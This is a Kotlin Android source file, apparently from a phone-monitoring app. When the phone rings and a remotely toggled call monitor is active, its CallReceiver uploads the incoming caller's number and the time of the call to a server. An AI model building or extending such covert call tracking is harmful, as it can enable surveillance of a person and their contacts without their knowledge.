package com.abuzahra.manager.service

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.TelephonyManager
import android.util.Log
import com.abuzahra.manager.api.ApiClient
import com.abuzahra.manager.executor.MonitorExecutor
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class CallReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent?) {
        if (intent?.action == "android.intent.action.PHONE_STATE") {
            try {
                val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
                val number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER) ?: "Unknown"

                when (state) {
                    TelephonyManager.EXTRA_STATE_RINGING -> {
                        Log.d("CallReceiver", "Incoming call from: $number")
                        if (MonitorExecutor.isCallMonitorActive()) {
                            CoroutineScope(Dispatchers.IO).launch {
                                ApiClient.sendData(context, "call", mapOf(
                                    "number" to number,
                                    "type" to "incoming",
                                    "time" to System.currentTimeMillis()
                                ))
                            }
                        }
                    }
                    TelephonyManager.EXTRA_STATE_OFFHOOK -> {
                        Log.d("CallReceiver", "Call answered")
                    }
                    TelephonyManager.EXTRA_STATE_IDLE -> {
                        Log.d("CallReceiver", "Call ended")
                    }
                }
            } catch (e: Exception) {
                Log.e("CallReceiver", "Error", e)
            }
        }
    }
}
